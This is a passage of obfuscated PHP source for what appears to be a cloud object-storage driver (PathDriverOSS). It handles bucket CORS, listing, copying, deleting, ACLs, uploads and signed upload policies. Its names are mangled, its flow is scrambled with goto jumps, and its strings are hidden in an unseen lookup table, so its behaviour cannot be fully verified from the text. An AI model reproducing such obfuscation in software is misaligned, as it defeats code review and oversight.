båÌú°∆´Ω; båÌú°∆´Ω: } public function upload($eﬂàãÕç≥ç, $f∂ü⁄Œ“ø«, $EÑﬁÚ≈ﬁƒò = false, $C¶«–ç«¡ª = REPEAT_REPLACE) { $CêÓ˘ÃåÁÔ = $this->copyFile($f∂ü⁄Œ“ø«, $eﬂàãÕç≥ç); return $CêÓ˘ÃåÁÔ ? $this->getPathOuter($eﬂàãÕç≥ç) : !1; } public function download($eƒüó∂Üºå, $f¥ÜÖã≠¬®) { return $this->iconvSystem($eƒüó∂Üºå); } } goto DîøÑäﬁ„’; EëùÜ´ﬂı•: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($dÏ¡∆‹ÕÇø) { parent::__construct(); include_once SDK_DIR . $_SERVER[¯èãÄπµ][1167]; $this->_init($dÏ¡∆‹ÕÇø); } public function _init($fù™ÃüÒ Õ) { foreach ($fù™ÃüÒ Õ as $BÍò„§¢õÂ => $BóÏè∞£Ÿ´) { if (isset($this->{$BÍò„§¢õÂ})) { $this->{$BÍò„§¢õÂ} = $BóÏè∞£Ÿ´; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¯èãÄπµ][1168], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto FÛÆÜ˘§äÇ; EÒª∂Ù‘ﬂ€: $fÚçÓä™¨‚->setMaxAgeSeconds(600); $fÚçÓä™¨‚->addExposeHeader($A⁄‡ﬁƒâ¿Û[1174]); $fÚçÓä™¨‚->addAllowedHeader($A⁄‡ﬁƒâ¿Û[1169]); goto a˘çêÑÉ¨Î; cÔëîû ¨„: $fÚçÓä™¨‚->addAllowedOrigin($A⁄‡ﬁƒâ¿Û[1169]); $fÚçÓä™¨‚->addAllowedMethod($A⁄‡ﬁƒâ¿Û[1170]); $fÚçÓä™¨‚->addAllowedMethod($A⁄‡ﬁƒâ¿Û[1171]); goto a´ë≠û®ë∂; a´ë≠û®ë∂: $fÚçÓä™¨‚->addAllowedMethod($A⁄‡ﬁƒâ¿Û[1172]); $fÚçÓä™¨‚->addAllowedMethod($A⁄‡ﬁƒâ¿Û[1173]); $fÚçÓä™¨‚->addAllowedMethod($A⁄‡ﬁƒâ¿Û[151]); goto EÒª∂Ù‘ﬂ€; FÛÆÜ˘§äÇ: $A⁄‡ﬁƒâ¿Û =& $_SERVER[¯èãÄπµ]; $E÷£ëôÖ©∆ = new OSS\Model\CorsConfig(); $fÚçÓä™¨‚ = new OSS\Model\CorsRule(); goto cÔëîû ¨„; a˘çêÑÉ¨Î: $E÷£ëôÖ©∆->addRule($fÚçÓä™¨‚); try { $this->client->putBucketCors($this->bucket, $E÷£ëôÖ©∆); } catch (OSS\Core\OssException $aæ≥à¶åπ°) { return !1; } return !0; goto bÖ©ÜÂæÌÇ; bÖ©ÜÂæÌÇ: } public function getBucketCors() { goto EÔíóé≠Ñâ; EﬁÜ¬ﬂ¢»ç: if (!$dÓ„ÏªÃ¢à || !($b—»à∆Ûåå = $dÓ„ÏªÃ¢à->getRules())) { return null; } $aı›¯äÿ‡∞ = $b—»à∆Ûåå[0]->getAllowedOrigins(); $bÑÉ÷¡ïéÃ = $b—»à∆Ûåå[0]->getAllowedMethods(); goto A¢áüŒ˘‘±; A¢áüŒ˘‘±: $c‘‹“çıüö = $b—»à∆Ûåå[0]->getMaxAgeSeconds(); $B’≥„Ó Î¥ = $b—»à∆Ûåå[0]->getExposeHeaders(); $Fﬂ¡õß«˘ø = $b—»à∆Ûåå[0]->getAllowedHeaders(); goto F»µ§·ö´; EÔíóé≠Ñâ: $b©¬™Í¥ãΩ =& $_SERVER[¯èãÄπµ]; $dÓ„ÏªÃ¢à = null; try { $dÓ„ÏªÃ¢à = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $f∫¡Âû¨åó) { return null; } goto EﬁÜ¬ﬂ¢»ç; F»µ§·ö´: return array($b©¬™Í¥ãΩ[171] => isset($aı›¯äÿ‡∞[0]) ? $aı›¯äÿ‡∞[0] : $b©¬™Í¥ãΩ[33], $b©¬™Í¥ãΩ[175] => $bÑÉ÷¡ïéÃ, $b©¬™Í¥ãΩ[1175] => $c‘‹“çıüö, $b©¬™Í¥ãΩ[1176] => isset($B’≥„Ó Î¥[0]) ? $B’≥„Ó Î¥[0] : $b©¬™Í¥ãΩ[33], $b©¬™Í¥ãΩ[173] => isset($Fﬂ¡õß«˘ø[0]) ? $Fﬂ¡õß«˘ø[0] : $b©¬™Í¥ãΩ[33]); goto døöò’Ÿã”; døöò’Ÿã”: } public function isBucketCors() { goto Aìç⁄µÊÈ£; aêËŸê…”: $EÛ≈‹∂ÁÜ› = array($bŸ˘‘è”ã“[176], $bŸ˘‘è”ã“[177], $bŸ˘‘è”ã“[178], $bŸ˘‘è”ã“[179], $bŸ˘‘è”ã“[180]); $c•Êô≥èÌ’ = array_diff($EÛ≈‹∂ÁÜ›, $FÌ‰Ü„û¡); return empty($c•Êô≥èÌ’); goto B¿Ÿü≥Æ⁄¨; Aìç⁄µÊÈ£: $bŸ˘‘è”ã“ =& $_SERVER[¯èãÄπµ]; $dêÕõ≤ÖÑØ = $this->getBucketCors(); if (!$dêÕõ≤ÖÑØ || !is_array($dêÕõ≤ÖÑØ)) { return !1; } goto Dò÷Èà¢Ò£; Dò÷Èà¢Ò£: if ($dêÕõ≤ÖÑØ[$bŸ˘‘è”ã“[171]] != $bŸ˘‘è”ã“[172] || $dêÕõ≤ÖÑØ[$bŸ˘‘è”ã“[173]] != $bŸ˘‘è”ã“[172]) { return !1; } $FÌ‰Ü„û¡ = array_map($bŸ˘‘è”ã“[174], $dêÕõ≤ÖÑØ[$bŸ˘‘è”ã“[175]]); if (!is_array($FÌ‰Ü„û¡)) { $FÌ‰Ü„û¡ = array(); } goto aêËŸê…”; B¿Ÿü≥Æ⁄¨: } public function mkfile($C¯íª ï–é, $Bı∞∂÷äé¡ = '', $C€‡Ò· êç = REPEAT_RENAME) { $cûÚÊÇ‰·Ô = $this->setContent($C¯íª ï–é, $Bı∞∂÷äé¡); if ($cûÚÊÇ‰·Ô !== !1) { return $this->getPathOuter($C¯íª ï–é); } return !1; } public function mkdir($eƒ∑¨Üà∫±, $c ¨ëèÓÃ  = REPEAT_SKIP) { if ($this->_isFolder($eƒ∑¨Üà∫±)) { return $this->getPathOuter($eƒ∑¨Üà∫±); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($eƒ∑¨Üà∫±)); } catch (OSS\Core\OssException $DÑ≠€Ã«óË) { return !1; } return $this->getPathOuter($eƒ∑¨Üà∫±); } private function fileList($CÙÔ≥íÔÜï, $AáÖÑ◊Îêö = '', $e∞ﬁ–ß¢„¬ = 0) { goto bÿñÇÖî¢; eèèè©√êå: $e¨Õàëçê∑ = $cìÀó…£¿–[33]; $d÷ÊàÖ”úß = 1000; $cùÑ©Ï—∞€ = $AÆ°„çßËô = array(); goto D¶˜Ï‡ﬂ¨Ø; D¶˜Ï‡ﬂ¨Ø: while (!0) { $A˘Û÷œƒ¶ˆ = array($cìÀó…£¿–[1177] => $AáÖÑ◊Îêö, $cìÀó…£¿–[182] => $CûﬂÏá…ÀÓ, $cìÀó…£¿–[1178] => $d÷ÊàÖ”úß, $cìÀó…£¿–[1179] => $e¨Õàëçê∑); try { $eÊΩÿº÷’Ÿ = $this->client->listObjects($this->bucket, $A˘Û÷œƒ¶ˆ); } catch (OSS\Core\OssException $F–∫åàÓùì) { break; } $e¨Õàëçê∑ = $eÊΩÿº÷’Ÿ->getNextMarker(); $CÏùãÑí†ç = $eÊΩÿº÷’Ÿ->getObjectList(); $cÉ≠‘ ãÜ = $eÊΩÿº÷’Ÿ->getPrefixList(); foreach ($CÏùãÑí†ç as $bÍÃëè‚§º) { if ($bÍÃëè‚§º->getKey() == $CûﬂÏá…ÀÓ) { continue; } $Dôùû∆üÛÓ = $bÍÃëè‚§º->getKey(); if ($e∞ﬁ–ß¢„¬) { $Dôùû∆üÛÓ = array($cìÀó…£¿–[28] => $Dôùû∆üÛÓ, $cìÀó…£¿–[77] => $bÍÃëè‚§º->getSize(), $cìÀó…£¿–[186] => strtotime($bÍÃëè‚§º->getLastModified())); } $AÆ°„çßËô[] = $Dôùû∆üÛÓ; } foreach ($cÉ≠‘ ãÜ as $f”†ò£ãÔµ) { $cùÑ©Ï—∞€[] = $f”†ò£ãÔµ->getPrefix(); } if ($e¨Õàëçê∑ === $cìÀó…£¿–[33]) { break; } } return array($cìÀó…£¿–[74] => $cùÑ©Ï—∞€, $cìÀó…£¿–[73] => $AÆ°„çßËô); goto FŸ÷…‚ÉÍÉ; bÿñÇÖî¢: $cìÀó…£¿– =& $_SERVER[¯èãÄπµ]; $CÙÔ≥íÔÜï = trim($CÙÔ≥íÔÜï, $cìÀó…£¿–[8]); $CûﬂÏá…ÀÓ = empty($CÙÔ≥íÔÜï) ? $cìÀó…£¿–[33] : $CÙÔ≥íÔÜï . $cìÀó…£¿–[8]; goto eèèè©√êå; FŸ÷…‚ÉÍÉ: } public function copyFile($cëπÒÿáòÊ, $f»Ê‘¿ò»¨) { $E¿¿∞ú´ó = $this->size($cëπÒÿáòÊ); if ($E¿¿∞ú´ó < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $cëπÒÿáòÊ, $this->bucket, $this->pathEncode($f»Ê‘¿ò»¨)); } catch (OSS\Core\OssException $Bÿ§å‰§“˜) { return !1; } return !0; } return $this->multiCopyObject($cëπÒÿáòÊ, $f»Ê‘¿ò»¨, $E¿¿∞ú´ó); } private function multiCopyObject($cãË˘Ñ……â, $fê◊˘ñªø¡, $F‚‘Ó‚√ÿÑ) { $AúÌ´Ñ€åî =& $_SERVER[¯èãÄπµ]; try { goto AóßŒõ‹∑Ù; AóßŒõ‹∑Ù: $FÙÚúâÜêé = array(); if ($aó∆êÛ¥∑¬ = $this->hashMd5($cãË˘Ñ……â)) { $FÙÚúâÜêé = array(OSS\OssClient::OSS_HEADERS => array($AúÌ´Ñ€åî[1180] => $aó∆êÛ¥∑¬)); } $fÎ“àˆ•”ƒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fê◊˘ñªø¡), $FÙÚúâÜêé); goto A∑í¯∏Éˆã; CâÒÂê◊∆å: $cı˜©ó›íÀ = 1024 * 1024 * 10; $BÑ—ÔãÑÉŸ = $this->client->generateMultiuploadParts($F‚‘Ó‚√ÿÑ, $cı˜©ó›íÀ); foreach ($BÑ—ÔãÑÉŸ as $Fà¢çÚÖ˘Ò => $Dç…¯„ÚÜ») { $CÕ»áéï˜ì = $c≥£ß‘∂—ˆ + (int) $Dç…¯„ÚÜ»[$AúÌ´Ñ€åî[1181]]; $Dòπ∂Õ¿’® = (int) $Dç…¯„ÚÜ»[$AúÌ´Ñ€åî[321]] + $CÕ»áéï˜ì - 1; $eùπ§◊…ÿ› = array($AúÌ´Ñ€åî[1182] => $CÕ»áéï˜ì, $AúÌ´Ñ€åî[1183] => $Dòπ∂Õ¿’®); $Cê„§ﬁ¿∫¢[] = $this->client->uploadPartCopy($this->bucket, $cãË˘Ñ……â, $this->bucket, $this->pathEncode($fê◊˘ñªø¡), $B…–ÖÇà≈», $fÎ“àˆ•”ƒ, $eùπ§◊…ÿ›); $B…–ÖÇà≈» = $B…–ÖÇà≈» + 1; } goto AÎÎ†ª«Î‡; AÎÎ†ª«Î‡: $BÆ©≠ïŒ¨ˆ = array(); foreach ($Cê„§ﬁ¿∫¢ as $Fà¢çÚÖ˘Ò => $f É‚ÚÚÍÖ) { $BÆ©≠ïŒ¨ˆ[] = array($AúÌ´Ñ€åî[1184] => $Fà¢çÚÖ˘Ò + 1, $AúÌ´Ñ€åî[1185] => $f É‚ÚÚÍÖ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fê◊˘ñªø¡), $fÎ“àˆ•”ƒ, $BÆ©≠ïŒ¨ˆ); goto B˜≠”Ìáæ¡; A∑í¯∏Éˆã: $B…–ÖÇà≈» = 1; $c≥£ß‘∂—ˆ = 0; $Cê„§ﬁ¿∫¢ = array(); goto CâÒÂê◊∆å; B˜≠”Ìáæ¡: } catch (OSS\Core\OssException $fπÛñÜ◊Ïà) { return !1; } return !0; } public function moveFile($BÕ‚ã∫◊≥⁄, $eıœã€ä˘‹) { if ($this->copyFile($BÕ‚ã∫◊≥⁄, $eıœã€ä˘‹)) { $this->remove($BÕ‚ã∫◊≥⁄); return !0; } return !1; } public function delFile($FÑ»ä≠∑ËÎ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($FÑ»ä≠∑ËÎ)); } catch (OSS\Core\OssException $Bò¬í†¡“¬) { return !1; } return !0; } public function delFolder($C§•ÈÖåé‘) { $BàÈÍ¬„⁄à =& $_SERVER[¯èãÄπµ]; $Fî·¶⁄†Ì™ = $this->fileList($C§•ÈÖåé‘); if (!empty($C§•ÈÖåé‘) && !in_array(trim($C§•ÈÖåé‘, $BàÈÍ¬„⁄à[8]) . $BàÈÍ¬„⁄à[8], $Fî·¶⁄†Ì™[$BàÈÍ¬„⁄à[73]])) { $Fî·¶⁄†Ì™[$BàÈÍ¬„⁄à[73]][] = trim($C§•ÈÖåé‘, $BàÈÍ¬„⁄à[8]) . $BàÈÍ¬„⁄à[8]; } foreach (array_chunk($Fî·¶⁄†Ì™[$BàÈÍ¬„⁄à[73]], 1000) as $Fä‘§úÇÆÙ) { try { $this->client->deleteObjects($this->bucket, $Fä‘§úÇÆÙ); } catch (OSS\Core\OssException $AÂá⁄Ã¶“†) { continue; } } return !0; } public function rename($fôÌù‹†˘Œ, $Dı§¬Øô“œ) { return $this->renameObject($fôÌù‹†˘Œ, $Dı§¬Øô“œ); } private function fileInfo($AÎŒ—Â Á¿, $C‘—ëè±¢ = array()) { goto EπŸ®°ﬂƒı; F≠ØÆãÃÎ◊: if (isset($C‘—ëè±¢[$DÙè≈Ö¿êÍ[77]])) { $f∆èºŸΩ ≥[$DÙè≈Ö¿êÍ[77]] = $C‘—ëè±¢[$DÙè≈Ö¿êÍ[77]]; } if (isset($C‘—ëè±¢[$DÙè≈Ö¿êÍ[106]])) { $f∆èºŸΩ ≥[$DÙè≈Ö¿êÍ[106]] = $C‘—ëè±¢[$DÙè≈Ö¿êÍ[106]]; } if (isset($C‘—ëè±¢[$DÙè≈Ö¿êÍ[186]]) && !trim($f∆èºŸΩ ≥[$DÙè≈Ö¿êÍ[106]])) { $f∆èºŸΩ ≥[$DÙè≈Ö¿êÍ[106]] = $C‘—ëè±¢[$DÙè≈Ö¿êÍ[186]]; } goto Eµ”Ñ‹≈™î; EπŸ®°ﬂƒı: $DÙè≈Ö¿êÍ =& $_SERVER[¯èãÄπµ]; $f∆èºŸΩ ≥ = array($DÙè≈Ö¿êÍ[28] => $this->pathThis($AÎŒ—Â Á¿), $DÙè≈Ö¿êÍ[75] => $this->getPathOuter($AÎŒ—Â Á¿), $DÙè≈Ö¿êÍ[29] => $DÙè≈Ö¿êÍ[163], $DÙè≈Ö¿êÍ[183] => 0, $DÙè≈Ö¿êÍ[106] => 0, $DÙè≈Ö¿êÍ[77] => 0, $DÙè≈Ö¿êÍ[156] => $this->ext($AÎŒ—Â Á¿), $DÙè≈Ö¿êÍ[184] => !0, $DÙè≈Ö¿êÍ[185] => !0); if (empty($C‘—ëè±¢)) { $d∫≈ äÜ—õ = $this->objectMeta($AÎŒ—Â Á¿); if (!$d∫≈ äÜ—õ) { return $f∆èºŸΩ ≥; } $C‘—ëè±¢ = array($DÙè≈Ö¿êÍ[106] => strtotime($d∫≈ äÜ—õ[$DÙè≈Ö¿êÍ[1186]]), $DÙè≈Ö¿êÍ[77] => $d∫≈ äÜ—õ[$DÙè≈Ö¿êÍ[1187]] + 0); } goto F≠ØÆãÃÎ◊; Eµ”Ñ‹≈™î: return $f∆èºŸΩ ≥; goto b…í∂ƒ«ªÑ; b…í∂ƒ«ªÑ: } private function folderInfo($cŸÌëœÉËø, $B’îÊèÈª = array()) { $f¡ºÀœÁ†ó =& $_SERVER[¯èãÄπµ]; $c’â∫ç√«ö = array($f¡ºÀœÁ†ó[28] => $this->pathThis($cŸÌëœÉËø), $f¡ºÀœÁ†ó[75] => $this->getPathOuter($f¡ºÀœÁ†ó[8] . $cŸÌëœÉËø), $f¡ºÀœÁ†ó[29] => $f¡ºÀœÁ†ó[76], $f¡ºÀœÁ†ó[183] => 0, $f¡ºÀœÁ†ó[106] => 0, $f¡ºÀœÁ†ó[184] => !0, $f¡ºÀœÁ†ó[185] => !0); if (empty($B’îÊèÈª)) { $cŸÌëœÉËø = rtrim($cŸÌëœÉËø, $f¡ºÀœÁ†ó[8]) . $f¡ºÀœÁ†ó[8]; $CîÜëé˘çˆ = $this->objectMeta($cŸÌëœÉËø); if (!$CîÜëé˘çˆ) { return $c’â∫ç√«ö; } $B’îÊèÈª = array($f¡ºÀœÁ†ó[183] => $CîÜëé˘çˆ[$f¡ºÀœÁ†ó[1188]][$f¡ºÀœÁ†ó[1189]], $f¡ºÀœÁ†ó[106] => strtotime($CîÜëé˘çˆ[$f¡ºÀœÁ†ó[1186]])); } if (isset($B’îÊèÈª[$f¡ºÀœÁ†ó[106]])) { $c’â∫ç√«ö[$f¡ºÀœÁ†ó[106]] = $B’îÊèÈª[$f¡ºÀœÁ†ó[106]]; } if (isset($B’îÊèÈª[$f¡ºÀœÁ†ó[183]])) { $c’â∫ç√«ö[$f¡ºÀœÁ†ó[183]] = $B’îÊèÈª[$f¡ºÀœÁ†ó[183]]; } return $c’â∫ç√«ö; } public function listPath($Eπ–ä˜úÌŸ, $b†‚Ã∂«â† = false) { $a˘ÑÒ◊öÒÇ =& $_SERVER[¯èãÄπµ]; $CÜ®Ù«í®¬ = $this->fileList($Eπ–ä˜úÌŸ, $a˘ÑÒ◊öÒÇ[8], !0); foreach ($CÜ®Ù«í®¬[$a˘ÑÒ◊öÒÇ[74]] as $e•§Ãæ’«Û => $E‘éŸôå‚◊) { $CÜ®Ù«í®¬[$a˘ÑÒ◊öÒÇ[74]][$e•§Ãæ’«Û] = $this->folderInfo($E‘éŸôå‚◊, $E‘éŸôå‚◊); } foreach ($CÜ®Ù«í®¬[$a˘ÑÒ◊öÒÇ[73]] as $e•§Ãæ’«Û => $E‘éŸôå‚◊) { $CÜ®Ù«í®¬[$a˘ÑÒ◊öÒÇ[73]][$e•§Ãæ’«Û] = $this->fileInfo($E‘éŸôå‚◊[$a˘ÑÒ◊öÒÇ[28]], $E‘éŸôå‚◊); } return $CÜ®Ù«í®¬; } public function has($F∂∂æ‹£†á, $Dó©åÜÑÓõ = false, $EÊñ∞ˆÆ‡‡ = true) { goto B∞Ïıπ»–Õ; a≠ºÉïÿ¡Ü: return !1; goto föıÍ±Îœç; B∞Ïıπ»–Õ: $DπäΩŸéÇΩ =& $_SERVER[¯èãÄπµ]; $F∂∂æ‹£†á = trim($F∂∂æ‹£†á, $DπäΩŸéÇΩ[8]); $e“èºΩ≈â… = empty($F∂∂æ‹£†á) ? $DπäΩŸéÇΩ[33] : $F∂∂æ‹£†á . $DπäΩŸéÇΩ[8]; goto Bå¥›ª§Î≤; Bå¥›ª§Î≤: $dÏ˜ÓúúèÑ = $DπäΩŸéÇΩ[33]; $c≤˘äáﬁåí = 500; $C∫‚”πÚ€É = 0; goto b∂‰â±´ËÚ; b∂‰â±´ËÚ: $Fﬁ…ÊÜà•Æ = 0; while (!0) { $aç„÷ø§Ç… = array($DπäΩŸéÇΩ[1177] => $DπäΩŸéÇΩ[8], $DπäΩŸéÇΩ[182] => $e“èºΩ≈â…, $DπäΩŸéÇΩ[1178] => $c≤˘äáﬁåí, $DπäΩŸéÇΩ[1179] => $dÏ˜ÓúúèÑ); try { $a≠ı…Œ≥èú = $this->client->listObjects($this->bucket, $aç„÷ø§Ç…); } catch (OSS\Core\OssException $AãÁ‘¨çÌÀ) { break; } $dÏ˜ÓúúèÑ = $a≠ı…Œ≥èú->getNextMarker(); $A¨∆¨ó∆ò¯ = $a≠ı…Œ≥èú->getObjectList(); $eùÑ±àÛµı = $a≠ı…Œ≥èú->getPrefixList(); if ($Dó©åÜÑÓõ) { if (count($A¨∆¨ó∆ò¯) > 1 || count($A¨∆¨ó∆ò¯) == 1 && $A¨∆¨ó∆ò¯[0]->getKey() != $e“èºΩ≈â…) { $C∫‚”πÚ€É += count($A¨∆¨ó∆ò¯) - 1; } if (!empty($eùÑ±àÛµı)) { $Fﬁ…ÊÜà•Æ += count($eùÑ±àÛµı); } if ($dÏ˜ÓúúèÑ === $DπäΩŸéÇΩ[33]) { break; } continue; } if ($EÊñ∞ˆÆ‡‡) { if (!empty($A¨∆¨ó∆ò¯)) { if (count($A¨∆¨ó∆ò¯) > 1 || $A¨∆¨ó∆ò¯[0]->getKey() != $e“èºΩ≈â…) { return !0; } } } else { if (!empty($eùÑ±àÛµı)) { return !0; } } if ($dÏ˜ÓúúèÑ === $DπäΩŸéÇΩ[33]) { break; } } if ($Dó©åÜÑÓõ) { return array($DπäΩŸéÇΩ[187] => $C∫‚”πÚ€É, $DπäΩŸéÇΩ[188] => $Fﬁ…ÊÜà•Æ); } goto a≠ºÉïÿ¡Ü; föıÍ±Îœç: } public function listAll($fÊ÷∑ü◊Ëä) { $fØÙ‡åàÈ§ =& $_SERVER[¯èãÄπµ]; $eÓ∏—ë¯ã° = $this->fileList($fÊ÷∑ü◊Ëä, $fØÙ‡åàÈ§[33], !0); $CÚ·ì‚Ï’≥ = array(); foreach ($eÓ∏—ë¯ã°[$fØÙ‡åàÈ§[73]] as $A è¢éØõ¢) { $CÚ·ì‚Ï’≥[$A è¢éØõ¢[$fØÙ‡åàÈ§[28]]] = $A è¢éØõ¢[$fØÙ‡åàÈ§[77]]; } return $this->listAllFiles($fÊ÷∑ü◊Ëä, array_keys($CÚ·ì‚Ï’≥), $CÚ·ì‚Ï’≥); } public function canRead($c™˜¨“Ó∫â) { $d∞∑˘¢àûÏ =& $_SERVER[¯èãÄπµ]; $F€ﬂÉìÏé© = $this->pathAcl($c™˜¨“Ó∫â); return $F€ﬂÉìÏé© == $d∞∑˘¢àûÏ[1190] || $F€ﬂÉìÏé© == $d∞∑˘¢àûÏ[487] ? !0 : !1; } public function canWrite($BÙÖÈ÷ΩÒ) { $DÊì◊…⁄º√ = $this->pathAcl($BÙÖÈ÷ΩÒ); return $DÊì◊…⁄º√ == $_SERVER[¯èãÄπµ][487] ? !0 : !1; } public function pathAcl($eÜí¥ú‘ÿû) { goto Eƒ≤ø‰ü¬ó; f™é†—ÎÑà: return $B¿⁄›‚ÛÀ•; goto EüÓê˜™œµ; Eƒ≤ø‰ü¬ó: $DﬂëÑËæ÷§ =& $_SERVER[¯èãÄπµ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bó€áà÷Éû = $this->client->getObjectAcl($this->bucket, $this->pathEncode($eÜí¥ú‘ÿû)); } catch (OSS\Core\OssException $F◊∏ÀﬁΩùœ) { return !1; } goto bá„ ÿ◊Ü•; bá„ ÿ◊Ü•: $B¿⁄›‚ÛÀ• = $bó€áà÷Éû == $DﬂëÑËæ÷§[34] ? $this->bucketAcl : $bó€áà÷Éû; if ($B¿⁄›‚ÛÀ• == $DﬂëÑËæ÷§[1191]) { return $DﬂëÑËæ÷§[1190]; } if ($B¿⁄›‚ÛÀ• == $DﬂëÑËæ÷§[1192]) { return $DﬂëÑËæ÷§[487]; } goto f™é†—ÎÑà; EüÓê˜™œµ: } private function chmodPath($d£ØÈ∂ë°ë, $bﬁ¶ñóˆ∫ = '') { $cìá§«ÖÑº =& $_SERVER[¯èãÄπµ]; $bƒÕÚ©“ø‡ = empty($bﬁ¶ñóˆ∫) ? $cìá§«ÖÑº[1192] : $bﬁ¶ñóˆ∫; $d¯… â„Ù≈ = array($cìá§«ÖÑº[34], $cìá§«ÖÑº[181], $cìá§«ÖÑº[1191], $cìá§«ÖÑº[1192]); if (!in_array($bƒÕÚ©“ø‡, $d¯… â„Ù≈)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($d£ØÈ∂ë°ë), $bƒÕÚ©“ø‡); } catch (OSS\Core\OssException $bç·á˘Ê∆®) { return !1; } return !0; } public function getContent($c≥ÖﬂÊ⁄ãâ) { return $this->fileSubstr($c≥ÖﬂÊ⁄ãâ, -1); } public function setContent($FüÒÍ˜ŒÎ¨, $Fﬁ∫¶›•£’ = '') { $b¿ä¿Ï˜èË =& $_SERVER[¯èãÄπµ]; try { $aÊæ¡Ÿëõî = $this->trafficLimit($b¿ä¿Ï˜èË[1193]); $EâÃØ¿èÈ” = $this->client->putObject($this->bucket, $this->pathEncode($FüÒÍ˜ŒÎ¨), $Fﬁ∫¶›•£’, $aÊæ¡Ÿëõî); } catch (OSS\Core\OssException $aÁÂ¨œ¬í†) { return !1; } $F•∑ê≈áõç = array($b¿ä¿Ï˜èË[1180] => trim($EâÃØ¿èÈ”[$b¿ä¿Ï˜èË[1194]], $b¿ä¿Ï˜èË[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($FüÒÍ˜ŒÎ¨))); $this->updateObjMeta($FüÒÍ˜ŒÎ¨, $F•∑ê≈áõç); return isset($EâÃØ¿èÈ”[$b¿ä¿Ï˜èË[1195]][$b¿ä¿Ï˜èË[1140]]) ? (int) $EâÃØ¿èÈ”[$b¿ä¿Ï˜èË[1195]][$b¿ä¿Ï˜èË[1140]] : strlen($EâÃØ¿èÈ”); } private function updateObjMeta($F‚¡£®ÛÇƒ, $c∫ªÃÀö‰ô) { $F‚¡£®ÛÇƒ = $this->pathEncode($F‚¡£®ÛÇƒ); try { $BââÎôªõç = array(OSS\OssClient::OSS_HEADERS => $c∫ªÃÀö‰ô); $this->client->copyObject($this->bucket, $F‚¡£®ÛÇƒ, $this->bucket, $F‚¡£®ÛÇƒ, $BââÎôªõç); } catch (OSS\Core\OssException $bËÉè⁄âàÛ) { return !1; } return !0; } public function upload($A≥æ›ßÜﬂì, $e¿ÓÏç≥Œ≠, $AâÉ˜êˆΩ• = false, $dñƒââ€ñ€ = REPEAT_REPLACE) { $B∑±≥¬Ø≠ñ =& $_SERVER[¯èãÄπµ]; $A¡ﬁ”£°‹Ü = trim($A≥æ›ßÜﬂì, $B∑±≥¬Ø≠ñ[8]); $a–«»ÚÑ◊¬ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($B∑±≥¬Ø≠ñ[1180] => @md5_file($e¿ÓÏç≥Œ≠)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A≥æ›ßÜﬂì))); $a–«»ÚÑ◊¬ = $this->trafficLimit($B∑±≥¬Ø≠ñ[1193], $a–«»ÚÑ◊¬); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($A¡ﬁ”£°‹Ü), $e¿ÓÏç≥Œ≠, $a–«»ÚÑ◊¬); } catch (OSS\Core\OssException $a¯åÃÌ’öƒ) { return !1; } return $this->getPathOuter($A≥æ›ßÜﬂì); } public function getHost() { $C®Ú…åœ¬° =& $_SERVER[¯èãÄπµ]; $c∆úÈ˘íåî = explode($C®Ú…åœ¬°[167], parent::getHost()); return $c∆úÈ˘íåî[0] . $C®Ú…åœ¬°[167] . $this->bucket . $C®Ú…åœ¬°[91] . $c∆úÈ˘íåî[1]; } public function uploadFormData($c∑ÖﬁﬁíŸÁ, $f¡ºÉÖÏŸï = 3600) { goto E¯ªÇÁıèï; eàÙ”ˆ◊Ç®: $D⁄„‡µñﬂ’ = $this->pathFather($c∑ÖﬁﬁíŸÁ); $dß£∫€ß◊Á = array($e›Á◊Ù≤º≈[1097] => $c™•≈†£ÿê, $e›Á◊Ù≤º≈[1098] => array(array($e›Á◊Ù≤º≈[1198], 0, $Fë˜©æùÌÑ), array($e›Á◊Ù≤º≈[1101], $e›Á◊Ù≤º≈[1102], $D⁄„‡µñﬂ’))); $Eﬂ≈˜°ÖÆ† = base64_encode(json_encode($dß£∫€ß◊Á)); goto b√ﬂÉ°· Õ; bû§¯·‰Ùâ: return $fÉîÛ≤øö–; goto BÕó¶‡Œ‡è; C‡ÉΩ¿ŸãÕ: $Eñ¿Ñ”ñÔò = date($e›Á◊Ù≤º≈[1196], time() + $FÇéÉ∏¿÷¯); $bÈ„êí’à“ = new DateTime($Eñ¿Ñ”ñÔò); $c™•≈†£ÿê = $bÈ„êí’à“->format(DateTime::ISO8601); goto CË–ƒ€âì∑; E¯ªÇÁıèï: $e›Á◊Ù≤º≈ =& $_SERVER[¯èãÄπµ]; if (!($B§Ê∫èÖ•‘ = $this->getHost())) { return !1; } $FÇéÉ∏¿÷¯ = $f¡ºÉÖÏŸï; goto C‡ÉΩ¿ŸãÕ; b√ﬂÉ°· Õ: $D”Ÿïê–±Û = base64_encode(hash_hmac($e›Á◊Ù≤º≈[214], $Eﬂ≈˜°ÖÆ†, $this->secret, !0)); $fÉîÛ≤øö– = array($e›Á◊Ù≤º≈[1107] => $Eﬂ≈˜°ÖÆ†, $e›Á◊Ù≤º≈[1199] => $this->accessKey, $e›Á◊Ù≤º≈[1103] => $e›Á◊Ù≤º≈[1095], $e›Á◊Ù≤º≈[1200] => $D”Ÿïê–±Û, $e›Á◊Ù≤º≈[165] => $B§Ê∫èÖ•‘); $fÉîÛ≤øö– = $this->trafficLimit($e›Á◊Ù≤º≈[1193], $fÉîÛ≤øö–); goto 